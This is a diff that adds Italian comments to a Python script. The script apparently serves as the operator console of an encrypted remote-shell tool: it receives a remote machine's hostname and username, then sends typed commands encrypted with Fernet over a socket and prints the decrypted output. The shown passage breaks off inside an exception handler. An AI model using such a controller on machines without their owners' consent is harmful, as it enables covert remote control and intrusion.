@@ -1,11 +1,11 @@
 import sys
 import socket
-from termcolor import colored,cprint
+from termcolor import colored,cprint   # Importo le librerie necessarie
 import time
 from cryptography.fernet import Fernet
 import os
 
-
+# Definisco la classe main
 class Main :
 
     def __init__(self,addr,port):
@@ -13,41 +13,41 @@ class Main :
         self.port = port
 
     @staticmethod
-    def invia_comandi(s,chiave):
+    def invia_comandi(s,chiave): #Invia e riceve i comandi crittografati
         try :
             fernet = Fernet(chiave)
             user_and_host = s.recv(4096)
-            user_and_host_decrypted = fernet.decrypt(user_and_host)
+            user_and_host_decrypted = fernet.decrypt(user_and_host) # Riceve e decripta hostname/username della macchina remota
             split = user_and_host_decrypted.decode("utf-8").split(":")
             hostname = split[1]
             username = split[3]
         except ConnectionResetError :
-            cprint("[Errore] Qualcosa è andato storto...")
+            cprint("[Errore] Qualcosa è andato storto...") # Ops, qualcosa è andato storto, esco
             s.close()
             sys.exit(4)
         while True :
-            try :
-                comando = input(f"{hostname}@{username} ")
+            try :  
+                comando = input(f"{hostname}@{username} ")   # Richiedo un comando da inviare
                 if len(comando) <= 0 :
-                    cprint("[Errore] Non puoi inviare un comando vuoto :)","red",sep="\n")
-                elif comando == "ESC" :
+                    cprint("[Errore] Non puoi inviare un comando vuoto :)","red",sep="\n") # Input vuoto? No, grazie
+                elif comando == "ESC" :   # Vuoi uscire? Esco...
                     cprint("[Info] Ok. A presto","green")
                     esc = "ESC"
                     s.send(fernet.encrypt(esc.encode()))
                     s.close()
                     sys.exit(2)
-                elif comando == "clear":
+                elif comando == "clear":  # Simulo il comando 'clear' su diversi SO
                     if os.name == "posix":
                         os.system("clear")
                     else :
                         os.system("cls")
                 else :
-                    s.send(fernet.encrypt(comando.encode()))
-                    data = s.recv(4096)
-                    toprint = fernet.decrypt(data)
-                    print(toprint.decode())
-            except KeyboardInterrupt :
-                cprint("[Info] Ok. A presto", "green")
+                    s.send(fernet.encrypt(comando.encode())) # Invio l'input criptato
+                    data = s.recv(4096)     # Ricevo l'output
+                    toprint = fernet.decrypt(data)  # Decodifico l'oggetto byte ricevuto
+                    print(toprint.decode())         # Stampo a video la stringa decodificata
+            except KeyboardInterrupt : # Ctrl+C? Esco...
+                cprint("[Info] Ok. A presto", "green")  
                 s.close()
                 sys.exit(2)
             except ConnectionResetError :
